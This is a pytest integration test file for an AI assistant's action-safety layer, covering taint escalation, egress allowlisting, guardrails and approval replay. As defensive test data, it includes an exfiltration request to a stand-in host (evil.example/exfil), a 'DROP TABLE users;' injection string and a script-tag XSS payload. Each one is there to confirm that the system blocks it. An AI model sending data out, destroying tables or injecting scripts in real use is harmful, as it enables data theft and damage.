from __future__ import annotations

import copy
from collections.abc import Generator
from dataclasses import dataclass, field
from typing import Any, cast

from fastapi.testclient import TestClient
import pytest
from sqlalchemy import select
from testcontainers.postgres import PostgresContainer

from ariel.app import ModelAdapter, create_app
from tests.integration.responses_helpers import responses_with_function_calls
from ariel.persistence import ActionAttemptRecord


@dataclass
class ActionProposalAdapter:
    provider: str = "provider.s2-pr02"
    model: str = "model.s2-pr02-v1"
    proposals_by_message: dict[str, list[dict[str, Any]]] = field(default_factory=dict)

    def create_response(
        self,
        *,
        input_items: list[dict[str, Any]],
        tools: list[dict[str, Any]],
        user_message: str,
        history: list[dict[str, Any]],
        context_bundle: dict[str, Any],
    ) -> dict[str, Any]:
        del tools, history, context_bundle
        proposals = self.proposals_by_message.get(user_message, [])
        return responses_with_function_calls(
            input_items=input_items,
            assistant_text=f"assistant::{user_message}",
            proposals=copy.deepcopy(proposals),
            provider=self.provider,
            model=self.model,
            provider_response_id="resp_s2_pr02_123",
            input_tokens=17,
            output_tokens=13,
        )


@pytest.fixture(scope="session")
def postgres_url() -> Generator[str, None, None]:
    with PostgresContainer("pgvector/pgvector:pg16") as postgres:
        url = postgres.get_connection_url()
        yield url.replace("psycopg2", "psycopg")


def _build_client(postgres_url: str, adapter: ModelAdapter) -> TestClient:
    app = create_app(
        database_url=postgres_url,
        model_adapter=adapter,
        reset_database=True,
    )
    return TestClient(app)


def _session_id(client: TestClient) -> str:
    active = client.get("/v1/sessions/active")
    assert active.status_code == 200
    return active.json()["session"]["id"]


def _event_types(turn_payload: dict[str, Any]) -> list[str]:
    return [event["event_type"] for event in turn_payload["events"]]


def _surface_attempt(turn_payload: dict[str, Any], *, proposal_index: int = 1) -> dict[str, Any]:
    lifecycle = turn_payload.get("surface_action_lifecycle")
    assert isinstance(lifecycle, list)
    assert len(lifecycle) >= proposal_index
    attempt = lifecycle[proposal_index - 1]
    assert isinstance(attempt, dict)
    return attempt


def _approval_ref(turn_payload: dict[str, Any], *, proposal_index: int = 1) -> str:
    attempt = _surface_attempt(turn_payload, proposal_index=proposal_index)
    approval = attempt.get("approval")
    assert isinstance(approval, dict)
    approval_ref = approval.get("reference")
    assert isinstance(approval_ref, str)
    return approval_ref


def _assert_surface_approval_response(
    payload: dict[str, Any],
    *,
    expected_status: str,
) -> None:
    assert set(payload.keys()) == {"ok", "approval", "assistant"}
    assert payload["ok"] is True
    assert "action_attempt" not in payload
    approval = payload["approval"]
    assert isinstance(approval, dict)
    assert set(approval.keys()) == {"reference", "status", "reason", "expires_at", "decided_at"}
    assert isinstance(approval["reference"], str)
    assert approval["status"] == expected_status


def test_s2_pr02_tainted_side_effect_is_escalated_to_approval_with_auditable_reason(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "tainted draft": [
                {
                    "capability_id": "cap.framework.write_draft",
                    "input": {"note": "draft from untrusted page"},
                    "influenced_by_untrusted_content": True,
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "tainted draft"})
        assert sent.status_code == 200
        body = sent.json()

        attempt = _surface_attempt(body["turn"])
        assert attempt["approval"]["status"] == "pending"
        assert attempt["policy"]["decision"] == "requires_approval"
        assert attempt["policy"]["reason"] == "taint_escalated_requires_approval"

        event_types = _event_types(body["turn"])
        assert "evt.action.execution.started" not in event_types
        proposed_event = next(
            event
            for event in body["turn"]["events"]
            if event["event_type"] == "evt.action.proposed"
        )
        assert proposed_event["payload"]["taint"]["influenced_by_untrusted_content"] is True
        policy_event = next(
            event
            for event in body["turn"]["events"]
            if event["event_type"] == "evt.action.policy_decided"
        )
        assert policy_event["payload"]["reason"] == "taint_escalated_requires_approval"


def test_s2_pr02_tainted_external_send_is_denied_with_explicit_reason(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "tainted outbound": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://api.framework.local/notify",
                        "message": "ship it",
                    },
                    "influenced_by_untrusted_content": True,
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(
            f"/v1/sessions/{session_id}/message", json={"message": "tainted outbound"}
        )
        assert sent.status_code == 200
        body = sent.json()

        attempt = _surface_attempt(body["turn"])
        assert attempt["policy"]["decision"] == "deny"
        assert attempt["policy"]["reason"] == "taint_denied_untrusted_side_effect"
        assert "taint_denied_untrusted_side_effect" in body["assistant"]["message"]

        event_types = _event_types(body["turn"])
        assert "evt.action.execution.started" not in event_types
        policy_event = next(
            event
            for event in body["turn"]["events"]
            if event["event_type"] == "evt.action.policy_decided"
        )
        assert policy_event["payload"]["reason"] == "taint_denied_untrusted_side_effect"


def test_s2_pr02_approval_execution_blocks_on_integrity_mismatch_before_invocation(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "integrity check": [
                {"capability_id": "cap.framework.write_note", "input": {"note": "pin me"}}
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(
            f"/v1/sessions/{session_id}/message", json={"message": "integrity check"}
        )
        assert sent.status_code == 200
        attempt = _surface_attempt(sent.json()["turn"])
        approval_ref = attempt["approval"]["reference"]
        action_attempt_id = attempt["action_attempt_id"]

        app = cast(Any, client.app)
        with app.state.session_factory() as db:
            with db.begin():
                action_attempt = db.scalar(
                    select(ActionAttemptRecord)
                    .where(ActionAttemptRecord.id == action_attempt_id)
                    .limit(1)
                )
                assert action_attempt is not None
                action_attempt.capability_version = "999.0"
                if hasattr(action_attempt, "capability_contract_hash"):
                    setattr(action_attempt, "capability_contract_hash", "f" * 64)

        approved = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve", "actor_id": "user.local"},
        )
        assert approved.status_code == 200
        approved_body = approved.json()
        _assert_surface_approval_response(approved_body, expected_status="approved")
        assert "integrity mismatch" in approved_body["assistant"]["message"].lower()

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        latest_attempt = _surface_attempt(latest_turn)
        assert latest_attempt["execution"]["status"] == "failed"
        assert "integrity_mismatch" in (latest_attempt["execution"]["error"] or "")
        event_types = _event_types(latest_turn)
        assert event_types.index("evt.action.approval.approved") < event_types.index(
            "evt.action.execution.failed"
        )
        assert "evt.action.execution.succeeded" not in event_types


def test_s2_pr02_non_allowlisted_egress_is_blocked_with_user_visible_auditable_reason(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "egress deny": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://evil.example/exfil",
                        "message": "top secret",
                    },
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "egress deny"})
        assert sent.status_code == 200
        approval_ref = _approval_ref(sent.json()["turn"])

        approved = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve", "actor_id": "user.local"},
        )
        assert approved.status_code == 200
        body = approved.json()
        _assert_surface_approval_response(body, expected_status="approved")
        assert "egress_destination_denied" in body["assistant"]["message"]

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        latest_attempt = _surface_attempt(latest_turn)
        assert latest_attempt["execution"]["status"] == "failed"
        assert "egress_destination_denied" in (latest_attempt["execution"]["error"] or "")
        failed_event = next(
            event
            for event in latest_turn["events"]
            if event["event_type"] == "evt.action.execution.failed"
        )
        assert "egress_destination_denied" in failed_event["payload"]["error"]


def test_s2_pr02_allowlisted_egress_executes_and_does_not_surface_internal_egress_metadata(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "egress allow": [
                {
                    "capability_id": "cap.framework.external_notify",
                    "input": {
                        "destination": "https://api.framework.local/notify",
                        "message": "safe payload",
                    },
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "egress allow"})
        assert sent.status_code == 200
        approval_ref = _approval_ref(sent.json()["turn"])

        approved = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve", "actor_id": "user.local"},
        )
        assert approved.status_code == 200
        _assert_surface_approval_response(approved.json(), expected_status="approved")
        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_attempt = _surface_attempt(timeline.json()["turns"][-1])
        assert latest_attempt["execution"]["status"] == "succeeded"
        output = latest_attempt["execution"]["output"]
        assert output is not None
        assert output["status"] == "sent"
        assert output["destination"] == "https://api.framework.local/notify"
        assert "__egress__" not in output


def test_s2_pr02_pre_execution_guardrail_blocks_unsafe_input_before_side_effects(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "unsafe write": [
                {
                    "capability_id": "cap.framework.write_note",
                    "input": {"note": "DROP TABLE users;"},
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "unsafe write"})
        assert sent.status_code == 200
        approval_ref = _approval_ref(sent.json()["turn"])

        approved = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve", "actor_id": "user.local"},
        )
        assert approved.status_code == 200
        _assert_surface_approval_response(approved.json(), expected_status="approved")
        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_attempt = _surface_attempt(timeline.json()["turns"][-1])
        assert latest_attempt["execution"]["status"] == "failed"
        assert "guardrail_pre_input_blocked" in (latest_attempt["execution"]["error"] or "")


def test_s2_pr02_post_execution_guardrail_blocks_unsafe_output_before_user_surfacing(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "unsafe read": [
                {
                    "capability_id": "cap.framework.read_echo",
                    "input": {"text": "<script>alert('x')</script>"},
                }
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "unsafe read"})
        assert sent.status_code == 200
        body = sent.json()
        attempt = _surface_attempt(body["turn"])
        assert attempt["execution"]["status"] == "failed"
        assert "guardrail_post_output_blocked" in (attempt["execution"]["error"] or "")
        assert "<script>" not in body["assistant"]["message"]


def test_s2_pr02_approval_replay_does_not_duplicate_side_effect_execution(
    postgres_url: str,
) -> None:
    adapter = ActionProposalAdapter(
        proposals_by_message={
            "single write": [
                {"capability_id": "cap.framework.write_note", "input": {"note": "once"}}
            ]
        }
    )
    with _build_client(postgres_url, adapter) as client:
        session_id = _session_id(client)
        sent = client.post(f"/v1/sessions/{session_id}/message", json={"message": "single write"})
        assert sent.status_code == 200
        approval_ref = _approval_ref(sent.json()["turn"])

        first = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve", "actor_id": "user.local"},
        )
        assert first.status_code == 200
        _assert_surface_approval_response(first.json(), expected_status="approved")
        first_timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert first_timeline.status_code == 200
        assert (
            _surface_attempt(first_timeline.json()["turns"][-1])["execution"]["status"]
            == "succeeded"
        )

        replay = client.post(
            "/v1/approvals",
            json={"approval_ref": approval_ref, "decision": "approve", "actor_id": "user.local"},
        )
        assert replay.status_code == 409
        assert replay.json()["error"]["code"] == "E_APPROVAL_NOT_PENDING"

        timeline = client.get(f"/v1/sessions/{session_id}/events")
        assert timeline.status_code == 200
        latest_turn = timeline.json()["turns"][-1]
        assert _event_types(latest_turn).count("evt.action.execution.started") == 1
        assert _event_types(latest_turn).count("evt.action.execution.succeeded") == 1
